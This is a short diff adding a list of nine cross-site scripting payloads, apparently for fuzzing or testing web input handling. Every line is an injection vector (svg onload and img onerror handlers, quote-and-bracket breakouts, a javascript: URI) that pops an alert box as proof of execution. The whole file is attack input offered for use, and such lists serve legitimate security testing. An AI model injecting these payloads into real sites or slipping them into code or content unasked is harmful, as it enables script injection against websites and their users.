@@ -1,0 +1,9 @@
+<svg/onload=alert(11111)//
+<svg/onload=alert(11111)>
+javascript:alert(11111)
+<img src=1 onerror=alert(11111)>
+<img src=1 onerror=alert(11111)//
+"><svg/onload=alert(11111)//
+"><svg/onload=alert(11111)>
+"><img src=1 onerror=alert(11111)>
+"><img src=alert(11111)//
